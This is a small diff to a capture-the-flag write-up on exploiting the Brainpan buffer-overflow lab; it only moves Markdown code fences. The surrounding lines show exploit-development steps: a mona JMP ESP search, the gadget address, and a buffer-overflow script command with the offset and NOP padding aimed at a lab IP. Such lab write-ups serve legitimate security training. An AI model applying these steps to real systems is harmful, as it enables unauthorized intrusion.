@@ -91,16 +91,17 @@ Write bad chars to find out which chars we have to exclude from our exploit:
 ```
 !mona jmp -n -r ESP
 ```
+
 ![9](imgs/brainpan-writeup9.png?raw=true)
 
 JMP ESP address = 0x311712f3
 
 Set breakpoint at 0x311712f3 and test it writing even more bytes to the application (the following command also adds some nops before and after write content):
-
+```
 ./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=1200 --buffhead='' --offset=524 --hexcontent=l311712f3 --after=BBBB --nopsa=4 --before=CCCC --nopsb=10
 ```
 ![10](imgs/brainpan-writeup10.png?raw=true)
-```
+
 
 ## 6. Exploit!
 
